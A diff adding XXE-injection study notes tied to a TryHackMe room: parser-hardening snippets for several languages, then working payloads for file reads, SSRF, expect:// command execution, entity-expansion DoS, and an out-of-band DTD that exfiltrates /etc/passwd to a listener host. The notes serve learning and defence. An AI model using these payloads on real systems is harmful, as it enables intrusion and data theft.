@@ -1,0 +1,162 @@
+#########
+## xxe ##
+#########
+## links
+# https://tryhackme.com/r/room/xxeinjection
+
+
+## best pratices
+Disable External Entities and DTDs
+Use Less Complex Data Formats (use json instead of xml)
+Allowlisting Input Validation (exclude of escape ' " & etc)
+
+# php
+libxml_disable_entity_loader(true);					# disable loading ext entities
+# python
+from defusedxml.ElementTree import parse				# defusedxml mitigate xml vuln
+# .NET
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.XmlResolver = null;
+settings.DtdProcessing = DtdProcessing.Prohibit;			# ignore DTDs and external entities
+# java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+DocumentBuilder db = dbf.newDocumentBuilder()				# disable dtds
+
+
+## xml example
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<name>test</name>
+<email>test@test.com</email>
+<password>test</password>
+</root>
+
+
+## local file inclusion
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+	<name>test</name>
+	<email>&xxe;</email>
+	<password>test</password>
+</root>
+
+
+## local file inclusion with PHPencode
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<root>
+        <name>test</name>
+        <email>&payload;</email>
+        <password>test</password>
+</root>
+
+
+## SSRF with PHPencode
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:8080/access.log"> ]>
+<root>
+        <name>test</name>
+        <email>&payload;</email>
+        <password>test</password>
+</root>
+
+
+## DOS, could expend ? leading to DOS
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe "This is a test message" >]>
+<contact>
+<name>&xxe; &xxe;</name>
+<email>test@test.com</email>
+<message>test</message>
+</contact>
+
+
+## RCE PHPexpect
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<root>
+        <name>test</name>
+        <email>&xxe;</email>
+        <password>test</password>
+</root>
+
+
+## out-of-band XXE
+# test
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://10.14.30.25:1337/" >]>
+<upload>
+<file>&xxe;</file>
+</upload>
+
+# exfil
+$ python -m http.server 1337
+$ cat sample.dtd
+<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://10.14.30.25:1337/?data=%cmd;'>">
+%oobxxe;
+
+# payload
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE upload SYSTEM "http://10.14.30.25:1337/sample.dtd">
+<upload>
+    <file>&exfil;</file>
+</upload>
+
+
+## SSRF+XXE, $10$ use it with burp suite
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://localhost:§10§/" >]>
+<contact>
+  <name>&xxe;</name>
+  <email>test@test.com</email>
+  <message>test</message>
+</contact>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
